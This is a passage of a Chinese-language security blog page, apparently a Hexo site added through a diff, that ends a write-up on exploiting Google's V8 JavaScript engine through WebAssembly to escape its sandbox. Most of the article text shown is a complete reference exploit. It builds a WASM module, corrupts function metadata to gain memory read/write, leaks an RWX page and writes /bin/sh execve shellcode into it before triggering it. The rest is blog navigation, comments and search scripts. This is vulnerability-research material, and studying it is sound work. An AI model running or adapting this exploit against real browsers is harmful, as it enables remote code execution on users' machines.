class="string">&quot;boom&quot;</span>)</span><br><span class="line">        (result i64)</span><br><span class="line">        (i64.<span class="type">const</span> <span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>可以从图中看出，泄露出的地址附件与上篇文章一样有类似的结构。由于<code>boom()</code>从未被调用过，且其恰好为低8个函数对应索引<code>0x7</code>。</p>
+<p><img src="/img/article/v8-361862752/image-20250415160359888.png" alt="image-20250415160359888"></p>
+<p>对应地址下断点，并调用<code>boom()</code>，也可以验证我们的猜想</p>
+<p><img src="/img/article/v8-361862752/image-20250415160839207.png" alt="image-20250415160839207"></p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>剩余就是写入shellcode，然后修改jmp地址即可</p>
+<blockquote>
+<p>但其实这种手法的exp，暂时没有AAW的原语也能完成利用</p>
+</blockquote>
+<p><img src="/img/article/v8-361862752/image-20250415162044136.png" alt="image-20250415162044136"></p>
+<p>参考exp如下:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">43</span>,<span class="number">8</span>,<span class="number">95</span>,<span class="number">1</span>,<span class="number">126</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">126</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">100</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">2</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">2</span>,<span class="number">100</span>,<span class="number">0</span>,<span class="number">126</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">3</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">126</span>,<span class="number">1</span>,<span class="number">126</span>,<span class="number">96</span>,<span class="number">1</span>,<span class="number">126</span>,<span class="number">1</span>,<span class="number">126</span>,<span class="number">96</span>,<span class="number">1</span>,<span class="number">100</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">126</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">99</span>,<span class="number">8</span>,<span class="number">18</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">104</span>,<span class="number">111</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">119</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">54</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">119</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">54</span>,<span class="number">52</span>,<span class="number">95</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">54</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">54</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">54</span>,<span class="number">52</span>,<span class="number">95</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">98</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">53</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">66</span>,<span class="number">210</span>,<span class="number">9</span>,<span class="number">251</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">251</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">66</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">66</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">0</span>,<span class="number">251</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">66</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInst = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmLeak = wasmInst.<span class="property">exports</span>.<span class="property">leak</span>;</span><br><span class="line"><span class="keyword">let</span> wasmLeaki64 = wasmInst.<span class="property">exports</span>.<span class="property">leak_i64</span>;</span><br><span class="line"><span class="keyword">let</span> wasmWrite64 = wasmInst.<span class="property">exports</span>.<span class="property">write64</span>;</span><br><span class="line"><span class="keyword">let</span> wasmWrite64Struct = wasmInst.<span class="property">exports</span>.<span class="property">write64_struct</span>;</span><br><span class="line"><span class="keyword">let</span> wasmRead64 = wasmInst.<span class="property">exports</span>.<span class="property">read64</span>;</span><br><span class="line"><span class="keyword">let</span> wasmRead64Struct = wasmInst.<span class="property">exports</span>.<span class="property">read64_struct</span>;</span><br><span class="line"><span class="keyword">let</span> wasmBoom = wasmInst.<span class="property">exports</span>.<span class="property">boom</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> placeholder = wasmInst.<span class="property">exports</span>.<span class="title function_">struct_placeholder</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5000000</span>; i++) <span class="title function_">wasmWrite64Struct</span>(placeholder, <span class="number">0n</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5000000</span>; i++) <span class="title function_">wasmWrite64</span>(<span class="number">0n</span>, <span class="number">0n</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i =<span class="number">0</span>; i &lt; <span class="number">5000000</span>; i++) <span class="title function_">wasmLeaki64</span>(<span class="number">0n</span>, <span class="number">0n</span>, <span class="number">0n</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i =<span class="number">0</span>; i &lt; <span class="number">5000000</span>; i++) <span class="title function_">wasmLeak</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i =<span class="number">0</span>; i &lt; <span class="number">5000000</span>; i++) <span class="title function_">wasmRead64</span>(<span class="number">0n</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i =<span class="number">0</span>; i &lt; <span class="number">5000000</span>; i++) <span class="title function_">wasmRead64Struct</span>(placeholder)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> heapView = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="keyword">new</span> <span class="title class_">Sandbox</span>.<span class="title class_">MemoryView</span>(<span class="number">0</span>, <span class="number">0x100000000</span>));</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">addrof</span> = (<span class="params">obj</span>) =&gt; <span class="title class_">Sandbox</span>.<span class="title function_">getAddressOf</span>(obj) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">hread32</span> = (<span class="params">addr</span>) =&gt; heapView.<span class="title function_">getUint32</span>(addr, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">hwrite32</span> = (<span class="params">addr, val</span>) =&gt; heapView.<span class="title function_">setUint32</span>(addr, val, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> leaki64SFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmLeaki64) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> leakSFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmLeak) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> leaki64TFD = <span class="title function_">hread32</span>(leaki64SFI + <span class="number">0x4</span>);</span><br><span class="line"><span class="keyword">let</span> write64SFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmWrite64) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> write64StructSFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmWrite64Struct) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> write64StructTFD = <span class="title function_">hread32</span>(write64StructSFI + <span class="number">0x4</span>);</span><br><span class="line"><span class="keyword">let</span> read64SFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmRead64) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> read64StructSFI = <span class="title function_">hread32</span>(<span class="title function_">addrof</span>(wasmRead64Struct) + <span class="number">0x14</span>) &amp; ~<span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> read64StructTFD = <span class="title function_">hread32</span>(read64StructSFI + <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">hwrite32</span>(write64SFI + <span class="number">0x4</span>, write64StructTFD);</span><br><span class="line"><span class="title function_">hwrite32</span>(leakSFI + <span class="number">0x4</span>, leaki64TFD);</span><br><span class="line"><span class="title function_">hwrite32</span>(read64SFI + <span class="number">0x4</span>, read64StructTFD);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line">    <span class="title function_">wasmWrite64</span>(val, addr - <span class="number">7n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="title function_">wasmLeak</span>();</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="title function_">wasmRead64</span>(addr - <span class="number">7n</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rwx_addr = <span class="title function_">leak</span>() - <span class="number">0x14n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;rwx_addr: 0x&quot;</span>+rwx_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">target = rwx_addr + <span class="number">0x1000n</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write64</span>(target,           <span class="number">0x622fbf4856f63148n</span>);</span><br><span class="line"><span class="title function_">write64</span>(target   + <span class="number">0x08n</span>, <span class="number">0x48570068732f6e69n</span>);</span><br><span class="line"><span class="title function_">write64</span>(target   + <span class="number">0x10n</span>, <span class="number">0xc0c748d23148e789n</span>);</span><br><span class="line"><span class="title function_">write64</span>(target   + <span class="number">0x18n</span>, <span class="number">0x050f006a0000003bn</span>);</span><br><span class="line"><span class="title function_">write64</span>(target   + <span class="number">0x30n</span>, <span class="number">0x0000000000050f00n</span>);</span><br><span class="line"><span class="title function_">write64</span>(rwx_addr + <span class="number">0x23n</span>, <span class="number">0xfd8e9n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">wasmBoom</span>();</span><br></pre></td></tr></table></figure>
+
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2025/04/10/%E3%80%90V8%E3%80%91Google%20CTF%202024%20heat%20SBX%20Escape/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+    
+        <div id="vcomments"></div>
+        <script>
+            var META = ['nick', 'mail', 'link'];
+            var meta = 'nick,mail';
+            meta = meta.split(',').filter(item => {
+                return META.includes(item);
+            });
+            new Valine({
+                el: '#vcomments',
+                appId: 'rb5WOYmmPvNLWkXLJIiqi1p0-gzGzoHsz',
+                appKey: 'B0j55vucTVteHiiUJeIL8Vx8',
+                lang: 'zh-CN',
+                placeholder: '这里是评论区:)',
+                avatar: 'mp',
+                meta: meta
+            })
+        </script>    
+     
+
+     
+    
+    
+
+</div>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+    
+      <div class="search-popup">
+    <div class="search-popup-overlay">  
+    </div>
+    <div class="search-popup-window" >
+        <div class="search-header">
+            <div class="search-input-container">
+              <input autocomplete="off" autocapitalize="off" maxlength="80"
+                     placeholder="Search Anything" spellcheck="false"
+                     type="search" class="search-input">
+            </div>
+            <div class="search-close-btn">
+                <div class="icon close-btn"></div>
+            </div>
+        </div>
+        <div class="search-result-container">
+        </div>
+    </div>
+</div>
+
+<script>
+    const searchConfig = {
+        path             : "/search.xml",
+        top_n_per_article: "1",
+        unescape         : "false",
+        trigger: "auto",
+        preload: "false"
+    }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+<script src="/js/search.js"></script>
+    
+    
+
+  <!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="Loora1N";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/about/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body>
+</html>
